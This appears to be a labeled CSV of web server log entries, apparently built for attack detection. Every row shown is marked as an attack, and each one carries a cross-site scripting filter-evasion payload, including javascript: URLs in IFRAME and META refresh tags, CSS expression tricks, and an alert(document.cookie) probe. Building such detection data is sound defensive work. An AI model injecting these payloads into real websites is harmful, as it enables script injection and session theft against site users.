"","ip","date","hour","minute","seconds","zone","request1","request2","status","respsize","url","computer","attaque"
"340","192.108.116.88","18/Dec/2017","15","45","34","+0000","GET ","img/logo.png HTTP/1.1/datalab <STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 0",1
"341","192.108.116.88","18/Dec/2017","15","47","33","+0000","POST ","datalab HTTP/1.1/NA/datalab <STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"342","192.108.116.88","18/Dec/2017","15","49","34","+0000","POST ","datalab HTTP/1.1/NA/datalab <STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"343","192.108.116.88","18/Dec/2017","15","49","52","+0000","GET "," HTTP/1.1/NA/datalab <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 26",1
"344","192.108.116.88","18/Dec/2017","15","49","52","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 23",1
"345","192.108.116.88","18/Dec/2017","15","49","52","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 14",1
"346","192.108.116.88","18/Dec/2017","15","51","52","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"347","192.108.116.88","18/Dec/2017","15","53","53","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"348","192.108.116.88","18/Dec/2017","15","54","07","+0000","GET "," HTTP/1.1/NA/datalab exp/*<A STYLE='no\xss:noxss(""*//*""); ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"349","192.108.116.88","18/Dec/2017","15","54","07","+0000","GET ","css/index.css HTTP/1.1/datalab exp/*<A STYLE='no\xss:noxss(""*//*""); ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"350","192.108.116.88","18/Dec/2017","15","54","07","+0000","GET ","img/logo.png HTTP/1.1/datalab exp/*<A STYLE='no\xss:noxss(""*//*""); ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"351","192.108.116.88","18/Dec/2017","15","56","07","+0000","POST ","datalab HTTP/1.1/NA/datalab exp/*<A STYLE='no\xss:noxss(""*//*""); ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"352","192.108.116.88","18/Dec/2017","15","58","08","+0000","POST ","datalab HTTP/1.1/NA/datalab exp/*<A STYLE='no\xss:noxss(""*//*""); ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"353","192.108.116.88","18/Dec/2017","15","58","32","+0000","GET "," HTTP/1.1/NA/datalab xss:ex/*XSS*//*/*/pression(alert(""XSS""))'> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"354","192.108.116.88","18/Dec/2017","15","58","32","+0000","GET ","css/index.css HTTP/1.1/datalab xss:ex/*XSS*//*/*/pression(alert(""XSS""))'> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"355","192.108.116.88","18/Dec/2017","15","58","33","+0000","GET ","img/logo.png HTTP/1.1/datalab xss:ex/*XSS*//*/*/pression(alert(""XSS""))'> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"356","192.108.116.88","18/Dec/2017","16","00","33","+0000","POST ","datalab HTTP/1.1/NA/datalab xss:ex/*XSS*//*/*/pression(alert(""XSS""))'> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"357","192.108.116.88","18/Dec/2017","16","02","33","+0000","POST ","datalab HTTP/1.1/NA/datalab xss:ex/*XSS*//*/*/pression(alert(""XSS""))'> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"358","192.108.116.88","18/Dec/2017","16","02","54","+0000","GET "," HTTP/1.1/NA/datalab <STYLE TYPE=""text/javascript"">alert('XSS');</STYLE> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 55",1
"359","192.108.116.88","18/Dec/2017","16","02","54","+0000","GET ","css/index.css HTTP/1.1/datalab <STYLE TYPE=""text/javascript"">alert('XSS');</STYLE> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 272",1
"360","192.108.116.88","18/Dec/2017","16","02","54","+0000","GET ","img/logo.png HTTP/1.1/datalab <STYLE TYPE=""text/javascript"">alert('XSS');</STYLE> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 50",1
"361","192.108.116.88","18/Dec/2017","16","04","54","+0000","POST ","datalab HTTP/1.1/NA/datalab <STYLE TYPE=""text/javascript"">alert('XSS');</STYLE> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"362","192.108.116.88","18/Dec/2017","16","06","55","+0000","POST ","datalab HTTP/1.1/NA/datalab <STYLE TYPE=""text/javascript"">alert('XSS');</STYLE> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"363","192.108.116.88","18/Dec/2017","16","07","16","+0000","GET "," HTTP/1.1/NA/datalab <STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 63",1
"364","192.108.116.88","18/Dec/2017","16","07","18","+0000","GET ","css/index.css HTTP/1.1/datalab <STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 17",1
"365","192.108.116.88","18/Dec/2017","16","07","18","+0000","GET ","img/logo.png HTTP/1.1/datalab <STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 3",1
"366","192.108.116.88","18/Dec/2017","16","09","18","+0000","POST ","datalab HTTP/1.1/NA/datalab <STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"367","192.108.116.88","18/Dec/2017","16","11","19","+0000","POST ","datalab HTTP/1.1/NA/datalab <STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"368","192.108.116.88","18/Dec/2017","16","11","42","+0000","GET "," HTTP/1.1/NA/datalab <STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 46",1
"369","192.108.116.88","18/Dec/2017","16","11","43","+0000","GET ","css/index.css HTTP/1.1/datalab <STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 21",1
"370","192.108.116.88","18/Dec/2017","16","11","43","+0000","GET ","img/logo.png HTTP/1.1/datalab <STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 4",1
"371","192.108.116.88","18/Dec/2017","16","13","43","+0000","POST ","datalab HTTP/1.1/NA/datalab <STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"372","192.108.116.88","18/Dec/2017","16","15","43","+0000","POST ","datalab HTTP/1.1/NA/datalab <STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"373","192.108.116.88","18/Dec/2017","16","16","04","+0000","GET "," HTTP/1.1/NA/datalab <XSS STYLE=""xss:expression(alert('XSS'))""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 35",1
"374","192.108.116.88","18/Dec/2017","16","16","04","+0000","GET ","css/index.css HTTP/1.1/datalab <XSS STYLE=""xss:expression(alert('XSS'))""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 13",1
"375","192.108.116.88","18/Dec/2017","16","16","04","+0000","GET ","img/logo.png HTTP/1.1/datalab <XSS STYLE=""xss:expression(alert('XSS'))""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"376","192.108.116.88","18/Dec/2017","16","18","04","+0000","POST ","datalab HTTP/1.1/NA/datalab <XSS STYLE=""xss:expression(alert('XSS'))""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"377","192.108.116.88","18/Dec/2017","16","20","04","+0000","POST ","datalab HTTP/1.1/NA/datalab <XSS STYLE=""xss:expression(alert('XSS'))""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"378","192.108.116.88","18/Dec/2017","16","20","26","+0000","GET "," HTTP/1.1/NA/datalab <XSS STYLE=""behavior: url(xss.htc);""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 56",1
"379","192.108.116.88","18/Dec/2017","16","20","27","+0000","GET ","css/index.css HTTP/1.1/datalab <XSS STYLE=""behavior: url(xss.htc);""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 54",1
"380","192.108.116.88","18/Dec/2017","16","20","27","+0000","GET ","img/logo.png HTTP/1.1/datalab <XSS STYLE=""behavior: url(xss.htc);""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 3",1
"381","192.108.116.88","18/Dec/2017","16","20","31","+0000","POST ","datalab HTTP/1.1/NA/datalab <XSS STYLE=""behavior: url(xss.htc);""> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 267",1
"382","192.108.116.88","18/Dec/2017","16","20","31","+0000","GET ","css/index.css HTTP/1.1/datalab <XSS STYLE=""behavior: url(xss.htc);""> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"383","192.108.116.88","18/Dec/2017","16","20","31","+0000","GET ","img/logo.png HTTP/1.1/datalab <XSS STYLE=""behavior: url(xss.htc);""> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 8",1
"384","192.108.116.88","18/Dec/2017","16","20","48","+0000","GET "," HTTP/1.1/NA/datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 6",1
"385","192.108.116.88","18/Dec/2017","16","20","49","+0000","GET ","css/index.css HTTP/1.1/datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 54",1
"386","192.108.116.88","18/Dec/2017","16","20","49","+0000","GET ","img/logo.png HTTP/1.1/datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 12",1
"387","192.108.116.88","18/Dec/2017","16","20","51","+0000","POST ","datalab HTTP/1.1/NA/datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 202",1
"388","192.108.116.88","18/Dec/2017","16","20","52","+0000","GET ","css/index.css HTTP/1.1/datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"389","192.108.116.88","18/Dec/2017","16","20","52","+0000","GET ","img/logo.png HTTP/1.1/datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 5",1
"390","192.108.116.88","18/Dec/2017","16","21","08","+0000","GET "," HTTP/1.1/NA/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;url=javascript:alert('XSS');"">",200,1040,NA,"MoNA",1
"391","192.108.116.88","18/Dec/2017","16","21","09","+0000","GET ","css/index.css HTTP/1.1/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;url=javascript:alert('XSS');"">",200,945,"http://31.14.135.81:3000/","MoNA",1
"392","192.108.116.88","18/Dec/2017","16","21","09","+0000","GET ","img/logo.png HTTP/1.1/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;url=javascript:alert('XSS');"">",200,34463,"http://31.14.135.81:3000/","MoNA",1
"393","192.108.116.88","18/Dec/2017","16","23","09","+0000","POST ","datalab HTTP/1.1/NA/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;url=javascript:alert('XSS');"">",NA,NA,"http://31.14.135.81:3000/","MoNA",1
"394","192.108.116.88","18/Dec/2017","16","25","09","+0000","POST ","datalab HTTP/1.1/NA/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;url=javascript:alert('XSS');"">",NA,NA,"http://31.14.135.81:3000/","MoNA",1
"395","192.108.116.88","18/Dec/2017","16","25","27","+0000","GET "," HTTP/1.1/NA/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;url=data:text/html",200,1040,NA,"MoNA",1
"396","192.108.116.88","18/Dec/2017","16","25","27","+0000","GET ","css/index.css HTTP/1.1/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;url=data:text/html",200,945,"http://31.14.135.81:3000/","MoNA",1
"397","192.108.116.88","18/Dec/2017","16","25","27","+0000","GET ","img/logo.png HTTP/1.1/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;url=data:text/html",200,34463,"http://31.14.135.81:3000/","MoNA",1
"398","192.108.116.88","18/Dec/2017","16","25","28","+0000","POST ","datalab HTTP/1.1/NA/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;url=data:text/html",200,1073,"http://31.14.135.81:3000/","MoNA",1
"399","192.108.116.88","18/Dec/2017","16","25","28","+0000","GET ","css/index.css HTTP/1.1/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;url=data:text/html",304,NA,"http://31.14.135.81:3000/","MoNA",1
"400","192.108.116.88","18/Dec/2017","16","25","28","+0000","GET ","img/logo.png HTTP/1.1/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;url=data:text/html",304,NA,"http://31.14.135.81:3000/","MoNA",1
"401","192.108.116.88","18/Dec/2017","16","25","52","+0000","GET "," HTTP/1.1/NA/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;",200,1040,NA,"MoNA",1
"402","192.108.116.88","18/Dec/2017","16","25","52","+0000","GET ","css/index.css HTTP/1.1/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;",200,945,"http://31.14.135.81:3000/","MoNA",1
"403","192.108.116.88","18/Dec/2017","16","25","52","+0000","GET ","img/logo.png HTTP/1.1/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;",200,34463,"http://31.14.135.81:3000/","MoNA",1
"404","192.108.116.88","18/Dec/2017","16","27","52","+0000","POST ","datalab HTTP/1.1/NA/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;",NA,NA,"http://31.14.135.81:3000/","MoNA",1
"405","192.108.116.88","18/Dec/2017","16","29","52","+0000","POST ","datalab HTTP/1.1/NA/datalab <META HTTP-EQUIV=""refresh CONTENT=""0;",NA,NA,"http://31.14.135.81:3000/","MoNA",1
"406","192.108.116.88","18/Dec/2017","16","30","11","+0000","GET "," HTTP/1.1/NA/datalab <IFRAME SRC=""javascript:alert('XSS');""></IFRAME> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 51",1
"407","192.108.116.88","18/Dec/2017","16","30","11","+0000","GET ","css/index.css HTTP/1.1/datalab <IFRAME SRC=""javascript:alert('XSS');""></IFRAME> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 87",1
"408","192.108.116.88","18/Dec/2017","16","30","11","+0000","GET ","img/logo.png HTTP/1.1/datalab <IFRAME SRC=""javascript:alert('XSS');""></IFRAME> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 8",1
"409","192.108.116.88","18/Dec/2017","16","32","11","+0000","POST ","datalab HTTP/1.1/NA/datalab <IFRAME SRC=""javascript:alert('XSS');""></IFRAME> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"410","192.108.116.88","18/Dec/2017","16","34","12","+0000","POST ","datalab HTTP/1.1/NA/datalab <IFRAME SRC=""javascript:alert('XSS');""></IFRAME> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"411","192.108.116.88","18/Dec/2017","16","34","35","+0000","GET "," HTTP/1.1/NA/datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 38",1
"412","192.108.116.88","18/Dec/2017","16","34","36","+0000","GET ","css/index.css HTTP/1.1/datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 13",1
"413","192.108.116.88","18/Dec/2017","16","34","36","+0000","GET ","img/logo.png HTTP/1.1/datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 4",1
"414","192.108.116.88","18/Dec/2017","16","34","37","+0000","POST ","datalab HTTP/1.1/NA/datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 259",1
"415","192.108.116.88","18/Dec/2017","16","34","37","+0000","GET ","img/logo.png HTTP/1.1/datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 30",1
"416","192.108.116.88","18/Dec/2017","16","34","37","+0000","GET ","css/index.css HTTP/1.1/datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 18",1
"417","192.108.116.88","18/Dec/2017","16","34","52","+0000","GET "," HTTP/1.1/NA/datalab <FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"418","192.108.116.88","18/Dec/2017","16","34","52","+0000","GET ","css/index.css HTTP/1.1/datalab <FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 4",1
"419","192.108.116.88","18/Dec/2017","16","34","53","+0000","GET ","img/logo.png HTTP/1.1/datalab <FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
